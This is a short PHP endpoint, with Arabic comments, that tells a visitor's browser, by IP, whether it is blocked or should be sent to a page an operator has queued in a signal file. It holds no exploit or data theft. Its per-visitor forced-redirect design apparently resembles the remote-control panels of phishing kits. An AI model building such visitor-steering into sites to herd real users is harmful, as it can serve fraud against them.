<?php
require_once '../config.php';
header('Content-Type: application/json; charset=utf-8');

$ip = getVisitorIP();

// التحقق من وجود حظر
$blockedFile = __DIR__ . '/../data/blocked_' . md5($ip) . '.signal';
if (file_exists($blockedFile)) {
    echo json_encode(['blocked' => true]);
    exit;
}

$file = __DIR__ . '/../data/force_' . md5($ip) . '.signal';

// التحقق من وجود توجيه
if (file_exists($file)) {
    $page = trim(file_get_contents($file));
    unlink($file); // نحذف الملف بعد القراءة لتفادي التكرار

    if (strpos($page, '.php') === false) {
        $page .= '.php';
    }

    echo json_encode(['force_redirect' => true, 'url' => $page]);
} else {
    echo json_encode(['force_redirect' => false]);
}
exit;
?>
